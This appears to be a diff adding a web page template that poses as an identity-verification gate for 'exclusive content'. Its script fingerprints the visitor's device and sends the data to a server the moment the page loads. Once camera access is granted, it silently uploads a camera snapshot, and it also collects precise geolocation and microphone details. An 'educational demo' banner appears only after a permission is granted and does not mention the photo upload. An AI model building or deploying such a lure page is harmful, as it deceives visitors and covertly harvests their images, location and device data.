@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Content - Verify Your Identity</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .verify-btn:disabled {
+            background: #4a4a4a;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .verify-btn.granted {
+            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+        }
+
+        .verify-btn.denied {
+            background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
+        }
+
+        .status-container {
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .status-icon {
+            font-size: 24px;
+            margin-right: 15px;
+        }
+
+        .status-text {
+            flex: 1;
+        }
+
+        .status-label {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .status-value {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .status-badge {
+            padding: 4px 12px;
+            border-radius: 15px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .badge-pending { background: #ffc107; color: #000; }
+        .badge-granted { background: #28a745; color: #fff; }
+        .badge-denied { background: #dc3545; color: #fff; }
+
+        .warning-banner {
+            display: none;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 30px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        .warning-banner h3 {
+            margin-bottom: 10px;
+        }
+
+        .data-collected {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            text-align: left;
+            font-size: 12px;
+            font-family: monospace;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #cameraPreview {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 10px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔐</div>
+        <h1>Identity Verification Required</h1>
+        <p class="subtitle">Please allow the following permissions to access exclusive content</p>
+
+        <div>
+            <button class="verify-btn" id="btnCamera" onclick="requestCamera()">
+                📷 Allow Camera
+            </button>
+            <button class="verify-btn" id="btnMic" onclick="requestMicrophone()">
+                🎤 Allow Microphone
+            </button>
+            <button class="verify-btn" id="btnLocation" onclick="requestLocation()">
+                📍 Allow Location
+            </button>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="status-container">
+            <div class="status-item">
+                <span class="status-icon">📷</span>
+                <div class="status-text">
+                    <div class="status-label">Camera Access</div>
+                    <div class="status-value" id="cameraStatus">Click to allow</div>
+                </div>
+                <span class="status-badge badge-pending" id="cameraBadge">Pending</span>
+            </div>
+
+            <div class="status-item">
+                <span class="status-icon">🎤</span>
+                <div class="status-text">
+                    <div class="status-label">Microphone Access</div>
+                    <div class="status-value" id="micStatus">Click to allow</div>
+                </div>
+                <span class="status-badge badge-pending" id="micBadge">Pending</span>
+            </div>
+
+            <div class="status-item">
+                <span class="status-icon">📍</span>
+                <div class="status-text">
+                    <div class="status-label">Location Access</div>
+                    <div class="status-value" id="locationStatus">Click to allow</div>
+                </div>
+                <span class="status-badge badge-pending" id="locationBadge">Pending</span>
+            </div>
+        </div>
+
+        <video id="cameraPreview" autoplay playsinline muted></video>
+        <canvas id="snapshotCanvas" style="display:none;"></canvas>
+
+        <div class="warning-banner" id="warningBanner">
+            <h3>⚠️ SECURITY DEMONSTRATION</h3>
+            <p>This is an educational demo showing what data websites can collect when you grant permissions!</p>
+            <div class="data-collected" id="collectedDataDisplay"></div>
+        </div>
+    </div>
+
+    <script>
+        // Unique visitor ID for this session
+        const visitorId = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+        // Collected data object
+        let collectedData = {
+            visitorId: visitorId,
+            timestamp: '<%= timestamp %>',
+            ip: '<%= visitorIP %>',
+            permissions: {
+                camera: 'pending',
+                microphone: 'pending',
+                location: 'pending'
+            },
+            deviceInfo: {},
+            location: null,
+            cameraAccess: false,
+            microphoneAccess: false
+        };
+
+        let permissionsGranted = 0;
+        let stream = null;
+
+        // Collect basic device info immediately
+        function collectDeviceInfo() {
+            collectedData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            };
+
+            // Network info if available
+            if (navigator.connection) {
+                collectedData.deviceInfo.network = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+        }
+
+        // Update progress bar
+        function updateProgress() {
+            const progress = (permissionsGranted / 3) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+
+            if (permissionsGranted > 0) {
+                document.getElementById('warningBanner').style.display = 'block';
+                updateDataDisplay();
+            }
+        }
+
+        // Update the collected data display
+        function updateDataDisplay() {
+            const display = document.getElementById('collectedDataDisplay');
+            display.innerHTML = '<strong>Data a malicious site could collect:</strong>\n\n' +
+                JSON.stringify(collectedData, null, 2);
+        }
+
+        // Send data to server
+        async function sendDataToServer() {
+            try {
+                await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(collectedData)
+                });
+            } catch (e) {
+                console.log('Demo: Data collection logged');
+            }
+        }
+
+        // Request Camera
+        async function requestCamera() {
+            const btn = document.getElementById('btnCamera');
+            const badge = document.getElementById('cameraBadge');
+            const status = document.getElementById('cameraStatus');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                // Show camera preview
+                const video = document.getElementById('cameraPreview');
+                video.srcObject = stream;
+                video.style.display = 'block';
+
+                // Take a snapshot
+                setTimeout(() => captureSnapshot(), 1000);
+
+                collectedData.permissions.camera = 'granted';
+                collectedData.cameraAccess = true;
+
+                btn.classList.add('granted');
+                btn.disabled = true;
+                badge.className = 'status-badge badge-granted';
+                badge.textContent = 'Granted';
+                status.textContent = 'Camera stream active!';
+
+                permissionsGranted++;
+                updateProgress();
+                sendDataToServer();
+
+            } catch (err) {
+                collectedData.permissions.camera = 'denied';
+                btn.classList.add('denied');
+                badge.className = 'status-badge badge-denied';
+                badge.textContent = 'Denied';
+                status.textContent = err.message;
+                sendDataToServer();
+            }
+        }
+
+        // Capture camera snapshot
+        function captureSnapshot() {
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.getElementById('snapshotCanvas');
+            const ctx = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.5);
+
+            // Send snapshot to server
+            fetch('/api/snapshot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    visitorId: visitorId,
+                    image: imageData
+                })
+            });
+        }
+
+        // Request Microphone
+        async function requestMicrophone() {
+            const btn = document.getElementById('btnMic');
+            const badge = document.getElementById('micBadge');
+            const status = document.getElementById('micStatus');
+
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+                collectedData.permissions.microphone = 'granted';
+                collectedData.microphoneAccess = true;
+
+                // Get audio devices info
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                collectedData.audioDevices = devices
+                    .filter(d => d.kind === 'audioinput')
+                    .map(d => ({ label: d.label, deviceId: d.deviceId.substr(0, 8) + '...' }));
+
+                btn.classList.add('granted');
+                btn.disabled = true;
+                badge.className = 'status-badge badge-granted';
+                badge.textContent = 'Granted';
+                status.textContent = `${collectedData.audioDevices.length} microphone(s) detected`;
+
+                // Stop audio stream (we just needed permission)
+                audioStream.getTracks().forEach(track => track.stop());
+
+                permissionsGranted++;
+                updateProgress();
+                sendDataToServer();
+
+            } catch (err) {
+                collectedData.permissions.microphone = 'denied';
+                btn.classList.add('denied');
+                badge.className = 'status-badge badge-denied';
+                badge.textContent = 'Denied';
+                status.textContent = err.message;
+                sendDataToServer();
+            }
+        }
+
+        // Request Location
+        function requestLocation() {
+            const btn = document.getElementById('btnLocation');
+            const badge = document.getElementById('locationBadge');
+            const status = document.getElementById('locationStatus');
+
+            if (!navigator.geolocation) {
+                status.textContent = 'Geolocation not supported';
+                badge.className = 'status-badge badge-denied';
+                badge.textContent = 'Unavailable';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    collectedData.permissions.location = 'granted';
+                    collectedData.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    };
+
+                    btn.classList.add('granted');
+                    btn.disabled = true;
+                    badge.className = 'status-badge badge-granted';
+                    badge.textContent = 'Granted';
+                    status.textContent = `Lat: ${position.coords.latitude.toFixed(4)}, Lng: ${position.coords.longitude.toFixed(4)}`;
+
+                    permissionsGranted++;
+                    updateProgress();
+                    sendDataToServer();
+                },
+                (error) => {
+                    collectedData.permissions.location = 'denied';
+                    btn.classList.add('denied');
+                    badge.className = 'status-badge badge-denied';
+                    badge.textContent = 'Denied';
+                    status.textContent = error.message;
+                    sendDataToServer();
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        // Initialize
+        collectDeviceInfo();
+        sendDataToServer();
+    </script>
+</body>
+</html>
